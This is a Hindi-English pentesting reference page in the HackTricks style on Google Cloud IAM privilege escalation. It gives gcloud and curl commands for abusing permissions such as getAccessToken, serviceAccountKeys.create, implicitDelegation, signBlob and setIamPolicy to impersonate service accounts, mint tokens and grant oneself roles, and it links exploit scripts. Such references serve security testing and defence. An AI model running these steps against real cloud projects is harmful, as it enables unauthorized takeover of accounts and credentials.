# GCP - IAM Privesc

{{#include ../../../banners/hacktricks-training.md}}

## IAM

Find more information about IAM in:

{{#ref}}
../gcp-services/gcp-iam-and-org-policies-enum.md
{{#endref}}

### `iam.roles.update` (`iam.roles.get`)

उक्त permissions वाले attacker आपके लिए assigned role को update कर सकेगा और आपको अन्य resources के लिए extra permissions दे सकेगा, जैसे:
```bash
gcloud iam roles update <rol name> --project <project> --add-permissions <permission>
```
आप यहाँ एक स्क्रिप्ट पा सकते हैं जो **creation, exploit and cleaning of a vuln environment here** को स्वचालित करती है और इस विशेषाधिकार का दुरुपयोग करने के लिए एक python स्क्रिप्ट [**here**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.roles.update.py). अधिक जानकारी के लिए [**original research**](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/).
```bash
gcloud iam roles update <Rol_NAME> --project <PROJECT_ID> --add-permissions <Permission>
```
### `iam.roles.create` & `iam.serviceAccounts.setIamPolicy`
iam.roles.create permission किसी प्रोजेक्ट/ऑर्गनाइज़ेशन में custom roles बनाने की अनुमति देती है। attacker के हाथों में यह खतरनाक है क्योंकि इससे वे नए permission सेट परिभाषित कर सकते हैं जिन्हें बाद में entities को सौंपा जा सकता है (उदाहरण के लिए, iam.serviceAccounts.setIamPolicy permission का उपयोग करके) with the goal of escalating privileges.
```bash
gcloud iam roles create <ROLE_ID> \
--project=<PROJECT_ID> \
--title="<Title>" \
--description="<Description>" \
--permissions="permission1,permission2,permission3"
```
### `iam.serviceAccounts.getAccessToken` (`iam.serviceAccounts.get`)

उक्त अनुमतियाँ रखने वाला हमलावर **Service Account का access token अनुरोध कर सकेगा**, इसलिए यह संभव है कि वह हमारी तुलना में अधिक अधिकारों वाले Service Account का access token अनुरोध कर ले।
```bash
gcloud --impersonate-service-account="${victim}@${PROJECT_ID}.iam.gserviceaccount.com" \
auth print-access-token
```
You can find a script to automate the [**creation, exploit and cleaning of a vuln environment here**](https://github.com/carlospolop/gcp_privesc_scripts/blob/main/tests/4-iam.serviceAccounts.getAccessToken.sh) and a python script to abuse this privilege [**here**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.getAccessToken.py). For more information check the [**original research**](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/).

### `iam.serviceAccountKeys.create`

उल्लिखित अनुमतियों वाले एक हमलावर को **Service Account के लिए user-managed key create** करने में सक्षम होंगे, जिससे हम उस Service Account के रूप में GCP तक पहुँच सकेंगे।
```bash
gcloud iam service-accounts keys create --iam-account <name> /tmp/key.json

gcloud auth activate-service-account --key-file=sa_cred.json
```
You can find a script to automate the [**creation, exploit and cleaning of a vuln environment here**](https://github.com/carlospolop/gcp_privesc_scripts/blob/main/tests/3-iam.serviceAccountKeys.create.sh) and a python script to abuse this privilege [**here**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccountKeys.create.py). For more information check the [**original research**](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/).

ध्यान दें कि **`iam.serviceAccountKeys.update` किसी SA की key को बदलने के लिए काम नहीं करेगा** क्योंकि ऐसा करने के लिए `iam.serviceAccountKeys.create` permission भी चाहिए।

### `iam.serviceAccounts.implicitDelegation`

यदि आपके पास किसी Service Account पर **`iam.serviceAccounts.implicitDelegation`** permission है और वह Service Account किसी तीसरे Service Account पर **`iam.serviceAccounts.getAccessToken`** permission रखता है, तो आप implicitDelegation का उपयोग करके उस तीसरे Service Account के लिए **token बना सकते हैं**। समझाने के लिए यहाँ एक डायग्राम है।

![](https://rhinosecuritylabs.com/wp-content/uploads/2020/04/image2-500x493.png)

ध्यान दें कि [**documentation**](https://cloud.google.com/iam/docs/understanding-service-accounts) के अनुसार, `gcloud` की delegation केवल [**generateAccessToken()**](https://cloud.google.com/iam/credentials/reference/rest/v1/projects.serviceAccounts/generateAccessToken) मेथड का उपयोग करके token जनरेट करने के लिए काम करती है। इसलिए यहाँ बताया गया है कि API का उपयोग करके सीधे token कैसे प्राप्त करें:
```bash
curl -X POST \
'https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/'"${TARGET_SERVICE_ACCOUNT}"':generateAccessToken' \
-H 'Content-Type: application/json' \
-H 'Authorization: Bearer '"$(gcloud auth print-access-token)" \
-d '{
"delegates": ["projects/-/serviceAccounts/'"${DELEGATED_SERVICE_ACCOUNT}"'"],
"scope": ["https://www.googleapis.com/auth/cloud-platform"]
}'
```
You can find a script to automate the [**creation, exploit and cleaning of a vuln environment here**](https://github.com/carlospolop/gcp_privesc_scripts/blob/main/tests/5-iam.serviceAccounts.implicitDelegation.sh) and a python script to abuse this privilege [**here**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.implicitDelegation.py). For more information check the [**original research**](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/).

### `iam.serviceAccounts.signBlob`

उल्लिखित permissions वाले एक attacker GCP में **arbitrary payloads पर sign** कर पाएगा। इसलिए यह संभव होगा कि हम **टारगेट किए गए SA का एक unsigned JWT बनाकर उसे एक blob के रूप में भेजें ताकि वह SA JWT पर साइन कर दे**। अधिक जानकारी के लिए [**read this**](https://medium.com/google-cloud/using-serviceaccountactor-iam-role-for-account-impersonation-on-google-cloud-platform-a9e7118480ed).

You can find a script to automate the [**creation, exploit and cleaning of a vuln environment here**](https://github.com/carlospolop/gcp_privesc_scripts/blob/main/tests/6-iam.serviceAccounts.signBlob.sh) and a python script to abuse this privilege [**here**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.signBlob-accessToken.py) and [**here**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.signBlob-gcsSignedUrl.py). For more information check the [**original research**](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/).

### `iam.serviceAccounts.signJwt`

उल्लिखित permissions वाले एक attacker **well-formed JSON web tokens (JWTs) पर sign** कर पाएगा। पिछले method से फर्क यह है कि **blob को साइन करवाने के बजाय हम signJWT method का उपयोग करते हैं जो पहले से ही एक JWT की अपेक्षा करता है**। इससे उपयोग करना आसान हो जाता है लेकिन आप किसी भी bytes की बजाय केवल JWTs ही साइन कर सकते हैं।

You can find a script to automate the [**creation, exploit and cleaning of a vuln environment here**](https://github.com/carlospolop/gcp_privesc_scripts/blob/main/tests/7-iam.serviceAccounts.signJWT.sh) and a python script to abuse this privilege [**here**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.signJWT.py). For more information check the [**original research**](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/).

### `iam.serviceAccounts.setIamPolicy` <a href="#iam.serviceaccounts.setiampolicy" id="iam.serviceaccounts.setiampolicy"></a>

उल्लिखित permissions वाले एक attacker **service accounts पर IAM policies जोड़** सकेंगे। आप इसका दुरुपयोग करके खुद को वे permissions दे सकते हैं जिनकी आपको किसी service account को impersonate करने के लिए आवश्यकता है। निम्न उदाहरण में हम अपने आप को टारगेट SA पर `roles/iam.serviceAccountTokenCreator` role दे रहे हैं:
```bash
gcloud iam service-accounts add-iam-policy-binding "${VICTIM_SA}@${PROJECT_ID}.iam.gserviceaccount.com" \
--member="user:username@domain.com" \
--role="roles/iam.serviceAccountTokenCreator"

# If you still have prblem grant yourself also this permission
gcloud iam service-accounts add-iam-policy-binding "${VICTIM_SA}@${PROJECT_ID}.iam.gserviceaccount.com" \ \
--member="user:username@domain.com" \
--role="roles/iam.serviceAccountUser"
```
You can find a script to automate the [**creation, exploit and cleaning of a vuln environment here**](https://github.com/carlospolop/gcp_privesc_scripts/blob/main/tests/d-iam.serviceAccounts.setIamPolicy.sh)**.**

### `iam.serviceAccounts.actAs`

The **iam.serviceAccounts.actAs permission** is like the **iam:PassRole permission from AWS**. यह Compute Engine instance जैसे कार्यों को चलाने के लिए आवश्यक है, क्योंकि यह किसी Service Account के रूप में "actAs" करने की क्षमता प्रदान करता है और permissions के सुरक्षित प्रबंधन को सुनिश्चित करता है। इसके बिना users अनुचित पहुँच प्राप्त कर सकते हैं। अतिरिक्त रूप से, **iam.serviceAccounts.actAs** का शोषण कई तरीकों से किया जा सकता है, जिनमें हर एक के लिए अलग-अलग permissions की आवश्यकता होती है, जबकि कुछ अन्य तरीकों के लिए सिर्फ एक permission काफी होता है।

#### Service account impersonation <a href="#service-account-impersonation" id="service-account-impersonation"></a>

Service account की impersonation नए और बेहतर privileges प्राप्त करने के लिए बहुत उपयोगी हो सकती है। आप तीन तरीकों से [impersonate another service account](https://cloud.google.com/iam/docs/understanding-service-accounts#impersonating_a_service_account):

- Authentication **using RSA private keys** (covered above)
- Authorization **using Cloud IAM policies** (covered here)
- **Deploying jobs on GCP services** (more applicable to the compromise of a user account)

### `iam.serviceAccounts.getOpenIdToken`

उल्लेखित permissions वाले attacker OpenID JWT generate कर पाएंगे। इन्हें identity assert करने के लिए उपयोग किया जाता है और ये आवश्यक रूप से किसी resource के खिलाफ implicit authorization नहीं देते।

According to this [**interesting post**](https://medium.com/google-cloud/authenticating-using-google-openid-connect-tokens-e7675051213b), audience (जिस service पर आप token का उपयोग करके authenticate करना चाहते हैं) बताना ज़रूरी है और आपको google द्वारा sign किया गया एक JWT मिलेगा जो service account और JWT के audience को दर्शाता है।

यदि आपके पास access है तो आप OpenIDToken निम्न के साथ generate कर सकते हैं:
```bash
# First activate the SA with iam.serviceAccounts.getOpenIdToken over the other SA
gcloud auth activate-service-account --key-file=/path/to/svc_account.json
# Then, generate token
gcloud auth print-identity-token "${ATTACK_SA}@${PROJECT_ID}.iam.gserviceaccount.com" --audiences=https://example.com
```
फिर आप बस इसका उपयोग सेवा तक पहुँचने के लिए कर सकते हैं:
```bash
curl -v -H "Authorization: Bearer id_token" https://some-cloud-run-uc.a.run.app
```
कुछ सेवाएँ जो इस प्रकार के tokens के माध्यम से authentication का समर्थन करती हैं:

- [Google Cloud Run](https://cloud.google.com/run/)
- [Google Cloud Functions](https://cloud.google.com/functions/docs/)
- [Google Identity Aware Proxy](https://cloud.google.com/iap/docs/authentication-howto)
- [Google Cloud Endpoints](https://cloud.google.com/endpoints/docs/openapi/authenticating-users-google-id) (if using Google OIDC)

आप उदाहरण देख सकते हैं कि एक service account की ओर से OpenID token कैसे बनाया जाए [**here**](https://github.com/carlospolop-forks/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.getOpenIdToken.py).

## संदर्भ

- [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{{#include ../../../banners/hacktricks-training.md}}
